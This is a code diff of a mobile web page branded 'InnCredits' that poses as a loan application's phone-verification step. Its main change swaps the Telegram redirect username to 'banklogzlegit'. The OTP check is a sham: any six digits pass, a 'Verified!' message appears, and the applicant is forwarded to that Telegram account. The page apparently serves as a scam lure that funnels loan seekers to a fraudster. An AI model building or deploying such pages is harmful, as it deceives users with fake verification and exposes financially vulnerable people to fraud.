@@ -5,209 +5,46 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>InnCredits · Verify Number</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background: #0b1120; font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif; display: flex; align-items: flex-start; justify-content: center; min-height: 100vh; padding: 16px 16px 32px 16px; }
+        .app-container { max-width: 500px; width: 100%; margin: 0 auto; display: flex; flex-direction: column; }
 
-        body {
-            background: #0b1120;
-            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif;
-            display: flex;
-            align-items: flex-start;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 16px 16px 32px 16px;
-        }
+        .loan-summary-bar { background: #111827; border-radius: 20px; padding: 14px 18px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; border: 1px solid #1f2a3e; }
+        .summary-item { display: flex; flex-direction: column; }
+        .summary-label { font-size: 0.7rem; color: #7e8aa2; text-transform: uppercase; }
+        .summary-value { font-size: 1rem; font-weight: 700; color: #14b8a6; }
 
-        .app-container {
-            max-width: 500px;
-            width: 100%;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-        }
+        .otp-card { background: #111827; border-radius: 32px; padding: 28px 24px 32px 24px; }
+        .section-title { font-size: 1.3rem; font-weight: 700; color: #ffffff; }
+        .section-sub { font-size: 0.8rem; color: #7e8aa2; margin-bottom: 28px; border-left: 3px solid #14b8a6; padding-left: 12px; }
 
-        .loan-summary-bar {
-            background: #111827;
-            border-radius: 20px;
-            padding: 14px 18px;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 10px;
-            border: 1px solid #1f2a3e;
-        }
-        .summary-item {
-            display: flex;
-            flex-direction: column;
-        }
-        .summary-label {
-            font-size: 0.7rem;
-            color: #7e8aa2;
-            text-transform: uppercase;
-        }
-        .summary-value {
-            font-size: 1rem;
-            font-weight: 700;
-            color: #14b8a6;
-        }
+        .phone-verify-box { background: #0f1724; border-radius: 24px; padding: 18px 16px; margin-bottom: 28px; display: flex; justify-content: space-between; align-items: center; }
+        .phone-number { font-size: 1.1rem; font-weight: 700; color: #e2e8f0; }
+        .edit-link { color: #14b8a6; background: rgba(20,184,166,0.1); padding: 6px 14px; border-radius: 40px; cursor: pointer; }
+        .edit-link:active { transform: scale(0.95); }
 
-        .otp-card {
-            background: #111827;
-            border-radius: 32px;
-            padding: 28px 24px 32px 24px;
-        }
+        .otp-container { display: flex; justify-content: center; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
+        .otp-box { width: 55px; height: 65px; background: #0f1724; border: 2px solid #1f2a3e; border-radius: 16px; text-align: center; font-size: 1.6rem; font-weight: 700; color: #14b8a6; outline: none; transition: all 0.2s; }
+        .otp-box:focus { border-color: #14b8a6; box-shadow: 0 0 0 3px rgba(20,184,166,0.2); }
 
-        .section-title {
-            font-size: 1.3rem;
-            font-weight: 700;
-            color: #ffffff;
-        }
-        .section-sub {
-            font-size: 0.8rem;
-            color: #7e8aa2;
-            margin-bottom: 28px;
-            border-left: 3px solid #14b8a6;
-            padding-left: 12px;
-        }
-
-        .phone-verify-box {
-            background: #0f1724;
-            border-radius: 24px;
-            padding: 18px 16px;
-            margin-bottom: 28px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .phone-number {
-            font-size: 1.1rem;
-            font-weight: 700;
-            color: #e2e8f0;
-        }
-        .edit-link {
-            color: #14b8a6;
-            background: rgba(20, 184, 166, 0.1);
-            padding: 6px 14px;
-            border-radius: 40px;
-            cursor: pointer;
-        }
-        .edit-link:active {
-            transform: scale(0.95);
-        }
-
-        .otp-container {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-        .otp-box {
-            width: 55px;
-            height: 65px;
-            background: #0f1724;
-            border: 2px solid #1f2a3e;
-            border-radius: 16px;
-            text-align: center;
-            font-size: 1.6rem;
-            font-weight: 700;
-            color: #14b8a6;
-            outline: none;
-            transition: all 0.2s;
-        }
-        .otp-box:focus {
-            border-color: #14b8a6;
-            box-shadow: 0 0 0 3px rgba(20, 184, 166, 0.2);
-        }
-
-        .timer-text {
-            text-align: center;
-            font-size: 0.8rem;
-            color: #7e8aa2;
-            margin-bottom: 8px;
-        }
-        .resend-btn {
-            display: block;
-            margin: 0 auto 24px;
-            background: none;
-            border: none;
-            color: #14b8a6;
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 0.85rem;
-            padding: 8px 16px;
-            border-radius: 40px;
-        }
-        .resend-btn:active {
-            transform: scale(0.96);
-        }
-        .verify-btn {
-            width: 100%;
-            background: #14b8a6;
-            border: none;
-            padding: 18px;
-            font-size: 1.1rem;
-            font-weight: 700;
-            color: #0b1120;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .verify-btn:active {
-            transform: scale(0.97);
-        }
-        .verify-btn.loading {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-        .success-message {
-            color: #14b8a6;
-            font-size: 0.8rem;
-            text-align: center;
-            margin-top: 12px;
-            display: none;
-            background: rgba(20, 184, 166, 0.1);
-            padding: 10px;
-            border-radius: 12px;
-        }
+        .timer-text { text-align: center; font-size: 0.8rem; color: #7e8aa2; margin-bottom: 8px; }
+        .resend-btn { display: block; margin: 0 auto 24px; background: none; border: none; color: #14b8a6; font-weight: 600; cursor: pointer; font-size: 0.85rem; padding: 8px 16px; border-radius: 40px; }
+        .resend-btn:active { transform: scale(0.96); }
+        .verify-btn { width: 100%; background: #14b8a6; border: none; padding: 18px; font-size: 1.1rem; font-weight: 700; color: #0b1120; border-radius: 60px; cursor: pointer; transition: all 0.2s; }
+        .verify-btn:active { transform: scale(0.97); }
+        .verify-btn.loading { opacity: 0.7; cursor: not-allowed; }
+        .success-message { color: #14b8a6; font-size: 0.8rem; text-align: center; margin-top: 12px; display: none; background: rgba(20,184,166,0.1); padding: 10px; border-radius: 12px; }
         .success-message.show { display: block; }
-        .error-message {
-            color: #f43f5e;
-            font-size: 0.8rem;
-            text-align: center;
-            margin-top: 12px;
-            display: none;
-            background: rgba(244, 63, 94, 0.1);
-            padding: 10px;
-            border-radius: 12px;
-        }
+        .error-message { color: #f43f5e; font-size: 0.8rem; text-align: center; margin-top: 12px; display: none; background: rgba(244,63,94,0.1); padding: 10px; border-radius: 12px; }
         .error-message.show { display: block; }
+        .telegram-note { text-align: center; margin-top: 16px; font-size: 0.7rem; color: #5c6f87; }
 
-        .telegram-note {
-            text-align: center;
-            margin-top: 16px;
-            font-size: 0.7rem;
-            color: #5c6f87;
-        }
-
-        @media (max-width: 450px) {
-            .otp-box { width: 48px; height: 55px; font-size: 1.4rem; }
-            .otp-container { gap: 8px; }
-        }
-
-        @media (max-width: 380px) {
-            .otp-box { width: 42px; height: 50px; font-size: 1.2rem; }
-        }
+        @media (max-width: 450px) { .otp-box { width: 48px; height: 55px; font-size: 1.4rem; } .otp-container { gap: 8px; } }
+        @media (max-width: 380px) { .otp-box { width: 42px; height: 50px; font-size: 1.2rem; } }
     </style>
 </head>
 <body>
 <div class="app-container">
-    <!-- TOP BAR - Loan Summary -->
     <div class="loan-summary-bar">
         <div class="summary-item"><span class="summary-label">Loan Amount</span><span class="summary-value" id="summaryAmount">$0</span></div>
         <div class="summary-item"><span class="summary-label">Term</span><span class="summary-value" id="summaryTerm">0</span></div>
@@ -238,9 +75,7 @@
         <div class="success-message" id="otpSuccess">✓ Verified! Redirecting to Telegram...</div>
         <div class="error-message" id="otpError">⚠️ Please enter all 6 digits</div>
         <button class="verify-btn" id="verifyBtn">Verify & Continue →</button>
-        <div class="telegram-note">
-            After verification, you'll be redirected to Telegram to complete your application
-        </div>
+        <div class="telegram-note">After verification, you'll be redirected to Telegram to complete your application</div>
     </div>
 </div>
 
@@ -248,29 +83,20 @@
     // ============================================
     // TELEGRAM REDIRECT - YOUR TELEGRAM USERNAME
     // ============================================
-    const TELEGRAM_USERNAME = 'Twist254';
+    const TELEGRAM_USERNAME = 'banklogzlegit';
     
     // ============================================
     // GET DATA FROM URL
     // ============================================
-    
     const urlParams = new URLSearchParams(window.location.search);
-    
-    // Get loan parameters from URL
     const amount = urlParams.get('amount') || '500';
     const term = urlParams.get('term') || '3';
     const rate = urlParams.get('rate') || '5';
     const monthly = urlParams.get('monthly') || '167.36';
-    
-    // Get user data from URL
     let userPhone = urlParams.get('phone') || '+1 234 567 8900';
     const userName = urlParams.get('name') || 'Customer';
     const userEmail = urlParams.get('email') || '';
     const applicationId = urlParams.get('appId') || localStorage.getItem('current_application_id');
-    
-    // ============================================
-    // UPDATE TOP BAR WITH LOAN DATA
-    // ============================================
     
     document.getElementById('summaryAmount').innerText = `$${parseInt(amount).toLocaleString()}`;
     document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
@@ -278,33 +104,19 @@
     document.getElementById('summaryRate').innerText = `${rate}%`;
     document.getElementById('displayPhone').innerText = userPhone;
     
-    console.log('📊 OTP Verify Page Loaded:');
-    console.log(`   Redirecting to Telegram: @${TELEGRAM_USERNAME}`);
-    
-    // ============================================
-    // FUNCTION TO REDIRECT TO TELEGRAM
-    // ============================================
+    console.log('📊 OTP Verify Page Loaded → Redirect to @' + TELEGRAM_USERNAME);
     
     function redirectToTelegram() {
-        // Simple message
         const message = `Hello, I have verified my number. My application is ready.`;
-        
-        // Encode message for URL
         const encodedMessage = encodeURIComponent(message);
-        
-        // Create Telegram URL with your username
         const telegramUrl = `https://t.me/${TELEGRAM_USERNAME}?text=${encodedMessage}`;
-        
         console.log('📱 Redirecting to Telegram:', telegramUrl);
-        
-        // Redirect to Telegram
         window.location.href = telegramUrl;
     }
     
     // ============================================
     // OTP PAGE LOGIC
     // ============================================
-    
     const timerText = document.getElementById('timerText');
     const resendBtn = document.getElementById('resendBtn');
     const verifyBtn = document.getElementById('verifyBtn');
@@ -328,12 +140,7 @@
         if (timerInterval) clearInterval(timerInterval);
         timeLeft = 120;
         updateTimer();
-        timerInterval = setInterval(() => { 
-            if (timeLeft > 0) { 
-                timeLeft--; 
-                updateTimer(); 
-            }
-        }, 1000);
+        timerInterval = setInterval(() => { if (timeLeft > 0) { timeLeft--; updateTimer(); } }, 1000);
     }
     
     function resetOTP() {
@@ -352,9 +159,7 @@
     let currentOtp = ['', '', '', '', '', ''];
     
     function updateOtpUI() {
-        otpBoxes.forEach((box, idx) => { 
-            box.value = currentOtp[idx] || ''; 
-        });
+        otpBoxes.forEach((box, idx) => { box.value = currentOtp[idx] || ''; });
     }
     
     function setOtpDigit(index, value) {
@@ -369,52 +174,33 @@
     }
     
     otpBoxes.forEach((box, idx) => {
-        box.addEventListener('focus', () => {
-            box.style.borderColor = '#14b8a6';
-        });
-        box.addEventListener('blur', () => {
-            box.style.borderColor = '#1f2a3e';
-        });
+        box.addEventListener('focus', () => { box.style.borderColor = '#14b8a6'; });
+        box.addEventListener('blur', () => { box.style.borderColor = '#1f2a3e'; });
         box.addEventListener('input', (e) => setOtpDigit(idx, e.target.value.slice(-1)));
         box.addEventListener('keydown', (e) => {
             if (e.key === 'Backspace') {
                 e.preventDefault();
-                if (currentOtp[idx] !== '') {
-                    setOtpDigit(idx, '');
-                } else if (idx > 0) { 
-                    setOtpDigit(idx - 1, ''); 
-                    otpBoxes[idx - 1].focus(); 
-                }
+                if (currentOtp[idx] !== '') setOtpDigit(idx, '');
+                else if (idx > 0) { setOtpDigit(idx - 1, ''); otpBoxes[idx - 1].focus(); }
             }
-            if (e.key === 'ArrowLeft' && idx > 0) {
-                e.preventDefault();
-                otpBoxes[idx - 1].focus();
-            }
-            if (e.key === 'ArrowRight' && idx < 5) {
-                e.preventDefault();
-                otpBoxes[idx + 1].focus();
-            }
+            if (e.key === 'ArrowLeft' && idx > 0) { e.preventDefault(); otpBoxes[idx - 1].focus(); }
+            if (e.key === 'ArrowRight' && idx < 5) { e.preventDefault(); otpBoxes[idx + 1].focus(); }
         });
         box.setAttribute('inputmode', 'numeric');
         box.setAttribute('autocomplete', 'off');
     });
     
-    // Paste support for 6 digits
     document.querySelector('.otp-container').addEventListener('paste', (e) => {
         e.preventDefault();
         const pasteData = e.clipboardData.getData('text').trim();
         if (pasteData && pasteData.match(/^\d{6}$/)) {
             const digits = pasteData.split('');
-            digits.forEach((digit, i) => {
-                if (i < 6) setOtpDigit(i, digit);
-            });
+            digits.forEach((digit, i) => { if (i < 6) setOtpDigit(i, digit); });
             otpBoxes[5].focus();
             errorMsg.classList.remove('show');
         } else if (pasteData && pasteData.length >= 6) {
             const digits = pasteData.slice(0,6).split('');
-            digits.forEach((digit, i) => {
-                if (i < 6 && digit.match(/[0-9]/)) setOtpDigit(i, digit);
-            });
+            digits.forEach((digit, i) => { if (i < 6 && digit.match(/[0-9]/)) setOtpDigit(i, digit); });
             otpBoxes[5].focus();
             errorMsg.classList.remove('show');
         } else {
@@ -424,39 +210,25 @@
         }
     });
     
-    // ============================================
-    // VERIFY BUTTON - Redirects to YOUR TELEGRAM
-    // ============================================
-    
     verifyBtn.onclick = () => {
         const enteredOtp = currentOtp.join('');
-        
         if (enteredOtp.length !== 6) {
             errorMsg.textContent = 'Please enter all 6 digits';
             errorMsg.classList.add('show');
             return;
         }
         
-        // Show loading state
         verifyBtn.textContent = 'Redirecting to Telegram...';
         verifyBtn.classList.add('loading');
         verifyBtn.disabled = true;
         
-        // Store verification status locally
         localStorage.setItem('inncredits_verified', 'true');
-        
         console.log('✅ Verification successful! Redirecting to Telegram...');
-        
-        // Show success message
         successMsg.classList.add('show');
         
-        // Redirect to YOUR Telegram
-        setTimeout(() => { 
-            redirectToTelegram();
-        }, 1000);
+        setTimeout(() => { redirectToTelegram(); }, 1000);
     };
     
-    // Edit phone number
     document.getElementById('editPhoneBtn').onclick = () => {
         const newPhone = prompt('Enter your phone number:', userPhone);
         if (newPhone && newPhone.trim().length > 5) { 
@@ -466,7 +238,6 @@
         }
     };
     
-    // Focus first box on load
     setTimeout(() => otpBoxes[0].focus(), 100);
 </script>
 </body>
